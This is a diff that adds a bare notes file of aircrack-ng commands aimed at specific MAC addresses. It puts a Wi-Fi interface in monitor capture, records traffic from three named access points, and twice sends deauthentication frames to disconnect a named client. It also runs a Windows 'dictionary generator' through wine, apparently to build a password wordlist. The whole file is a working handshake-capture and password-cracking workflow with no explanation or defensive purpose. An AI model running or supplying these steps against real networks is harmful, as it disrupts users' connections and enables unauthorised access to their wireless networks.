@@ -1,0 +1,15 @@
+airodump-ng wlan0mon
+
+airodump-ng -w work -c 6 --bssid CE:62:FE:B7:AC:AD wlan0mon
+airodump-ng -w work -c 1 --bssid 22:63:48:E0:F2:D9 wlan0mon
+airodump-ng -w work -c 11 --bssid 88:6E:DD:65:76:0E wlan0mon
+
+88:6E:DD:65:76:0E
+22:63:48:E0:F2:D9
+
+aireplay-ng -0 2 -a C0:A5:DD:68:54:49 -c C0:4B:24:3E:85:DA wlan0mon
+
+
+wine 字典生成器.exe
+
+aireplay-ng -0 2 -a C0:A5:DD:68:54:49 -c C0:4B:24:3E:85:DA wlan0mon
